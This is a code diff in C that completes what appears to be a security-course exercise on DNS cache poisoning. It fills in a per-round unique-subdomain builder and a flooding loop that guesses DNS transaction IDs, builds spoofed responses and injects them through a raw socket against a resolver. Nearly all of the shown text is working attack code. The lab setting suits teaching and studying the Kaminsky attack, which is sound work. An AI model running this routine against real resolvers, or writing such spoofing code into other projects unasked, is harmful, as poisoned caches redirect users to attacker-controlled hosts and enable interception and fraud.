@@ -324,15 +324,21 @@ static void cleanup_raw_socket(void)
     }
 }
 
-/* Generate a unique subdomain for this round, e.g. ww<round>.example1... */
+/**
+ * build_unique_subdomain - Generate unique subdomain for each attack round
+ * @round: Round number to incorporate into subdomain
+ * @buf: Output buffer for the subdomain string
+ * @buf_len: Size of output buffer
+ * 
+ * Creates subdomains like: www.example0.cybercourse.example.com,
+ * www.example1.cybercourse.example.com, etc.
+ * 
+ * Each round needs a unique subdomain to avoid cache hits from previous
+ * rounds, giving us a fresh attack window.
+ */
 static void build_unique_subdomain(int round, char *buf, size_t buf_len)
 {
-    /* TODO: snprintf into buf something like:
-     * ww<round>.example1.cybercourse.example.com
-     */
-    (void)round;
-    (void)buf;
-    (void)buf_len;
+    snprintf(buf, buf_len, "www.example%d.cybercourse.example.com", round);
 }
 
 /**
@@ -574,11 +580,47 @@ static void perform_attack_round(int round)
     build_unique_subdomain(round, subdomain, sizeof(subdomain));
 
     /* Step 1: send query to resolver */
+    printf("[Round %d] Querying resolver for: %s\n", round, subdomain);
     (void)send_dns_query_to_resolver(subdomain);
 
     /* Step 2: flood with spoofed answers trying different TXIDs */
-    /* NOTE: Do not exceed MAX_SPOOFED_PKTS total (per exercise requirement). */
-    /* TODO: loop over txid guesses, build spoofed packet, inject via pcap. */
+    printf("[Round %d] Flooding with up to %d spoofed responses...\n", 
+           round, MAX_SPOOFED_PKTS);
+    
+    uint8_t *spoofed_dns = NULL;
+    size_t spoofed_len = 0;
+    int successful_injections = 0;
+    
+    for (uint32_t i = 0; i < MAX_SPOOFED_PKTS; i++) {
+        // Try different TXID values across the 16-bit space
+        // We cycle through all possible values multiple times
+        uint16_t txid_guess = (uint16_t)(i & 0xFFFF);
+        
+        // Build spoofed DNS response with guessed TXID
+        if (build_spoofed_response(subdomain, txid_guess, 
+                                   &spoofed_dns, &spoofed_len) < 0) {
+            continue; // Skip this TXID on error
+        }
+        
+        // Inject the spoofed packet via raw socket
+        if (inject_spoofed_packet(spoofed_dns, spoofed_len) == 0) {
+            successful_injections++;
+        }
+        
+        // Free the allocated DNS buffer
+        if (spoofed_dns) {
+            free(spoofed_dns);
+            spoofed_dns = NULL;
+        }
+        
+        // Optional: Print progress every 10000 packets
+        if ((i + 1) % 10000 == 0) {
+            printf("  Sent %u/%d packets...\n", i + 1, MAX_SPOOFED_PKTS);
+        }
+    }
+    
+    printf("[Round %d] Injection complete: %d/%d packets sent successfully\n",
+           round, successful_injections, MAX_SPOOFED_PKTS);
 }
 
 /* Check if poisoning succeeded by querying
